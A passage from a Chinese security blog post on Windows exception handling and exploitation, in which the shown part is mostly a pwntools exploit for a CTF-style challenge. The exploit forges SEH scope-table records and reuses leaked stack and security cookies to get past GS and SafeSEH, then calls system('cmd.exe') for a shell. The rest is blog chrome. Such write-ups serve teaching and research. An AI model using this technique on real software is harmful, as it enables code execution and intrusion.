exc_ptr</span></span><br><span class="line">fake_CPPEH_RECORD += p32(stack_addr + <span class="number">0x18c</span>) <span class="comment"># next</span></span><br><span class="line">fake_CPPEH_RECORD += p32(pe.address + <span class="number">0x1e30</span>)  <span class="comment"># EXceptionHandler ==&gt; overwrite with our addr</span></span><br><span class="line">fake_CPPEH_RECORD += p32(stack_addr ^ security_cookie) <span class="comment"># ScopeTable</span></span><br><span class="line">fake_CPPEH_RECORD += p32(<span class="number">0xfffffffe</span>) <span class="comment"># TryLevel</span></span><br><span class="line"><span class="comment">#----------------------------------------------------------</span></span><br><span class="line"><span class="comment"># 001390a0  ffffffe4 00000000 fffffe00 00000000  ................</span></span><br><span class="line"><span class="comment"># 001390b0  fffffffe 001318b7 001318bd 00000000  ................</span></span><br><span class="line"><span class="comment"># 001390c0  fffffffe 00000000 ffffffac 00000000  ................</span></span><br><span class="line"><span class="comment">#-------------------fake_ScopeTable-----------------------</span></span><br><span class="line">FilterFunc = pe.address + <span class="number">0x18b7</span></span><br><span class="line">HandlerFunc = pe.address + <span class="number">0x18bd</span></span><br><span class="line">fake_ScopeTable = p32(<span class="number">0xffffffe4</span>)   <span class="comment"># GSCookieOffset</span></span><br><span class="line">fake_ScopeTable += p32(<span class="number">0x00000000</span>)  <span class="comment"># GSCookieXOROffset</span></span><br><span class="line">fake_ScopeTable += p32(<span class="number">0xfffffe00</span>)  <span class="comment"># EHCookieOffset</span></span><br><span class="line">fake_ScopeTable += p32(<span class="number">0x00000000</span>)  <span class="comment"># EHCookieXOROffset</span></span><br><span class="line">fake_ScopeTable += p32(<span class="number">0xfffffffe</span>)  <span class="comment"># ScopeRecord.EnclosingLevel</span></span><br><span class="line">fake_ScopeTable += p32(FilterFunc)  <span class="comment"># ScopeRecord.FilterFunc</span></span><br><span class="line">fake_ScopeTable += p32(HandlerFunc) <span class="comment"># ScopeRecord.HandlerFunc</span></span><br><span class="line">fake_ScopeTable += p32(<span class="number">0x00000000</span>)  <span class="comment"># end of ScopeTable  </span></span><br><span class="line"><span class="comment">#----------------------------------------------------------</span></span><br><span class="line">payload = fake_ScopeTable</span><br><span class="line">payload = payload.ljust(<span class="number">0x104</span>, <span class="string">&#x27;\xcc&#x27;</span>)</span><br><span class="line">payload += p32(stack_cookie)</span><br><span class="line">payload += fake_CPPEH_RECORD</span><br><span class="line">payload += p32(stack_addr) <span class="comment"># rbp</span></span><br><span class="line">payload += p32(ucrtbased.symbols[<span class="string">&#x27;system&#x27;</span>]) + p32(main_addr) + p32(ucrtbased.search(<span class="string">&quot;cmd.exe&quot;</span>).<span class="built_in">next</span>())</span><br><span class="line">sa(<span class="string">&quot;Input again:&quot;</span>, payload)</span><br><span class="line">sla(<span class="string">&quot;Give me one shot: &quot;</span>, <span class="built_in">str</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+
+        </div>
+
+        
+            <div class="post-copyright-info my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Windows 异常处理 &amp; 例题</li>
+        <li><strong>Author:</strong> henry</li>
+        <li><strong>Created at
+                :</strong> 2024-05-17 21:49:21</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-05-17 21:57:14
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://henrymartin262.github.io/2024/05/17/windows-异常处理/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/windows%EF%BC%8Cwinpwn%EF%BC%8Cstack%EF%BC%8Cgs%EF%BC%8CSEHOP/">#windows，winpwn，stack，gs，SEHOP</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/SEH/">#SEH</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/SafeSEH/">#SafeSEH</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/05/15/winpwn-%E5%85%A5%E9%97%A8/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Windows pwn 入门</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container pjax">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fa-solid fa-comments"></i>&nbsp;Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          requiredMeta: ['nick', 'mail']
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Windows 异常处理 &amp; 例题</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Windows-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86"><span class="nav-text">Windows 异常处理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#win%E5%B8%B8%E8%A7%81%E7%BB%93%E6%9E%84"><span class="nav-text">win常见结构</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PEB"><span class="nav-text">PEB</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TEB"><span class="nav-text">TEB</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SEH"><span class="nav-text">SEH</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SEHOP"><span class="nav-text">SEHOP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SafeSEH"><span class="nav-text">SafeSEH</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98-1"><span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SafeSEH-1"><span class="nav-text">SafeSEH</span></a></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">henry</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.6</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+    <div id="aplayer"></div>
+
+<script src="/js/libs/APlayer.min.js"></script>
+
+
+<script src="/js/plugins/aplayer.js"></script>
+
+
+</body>
+</html>
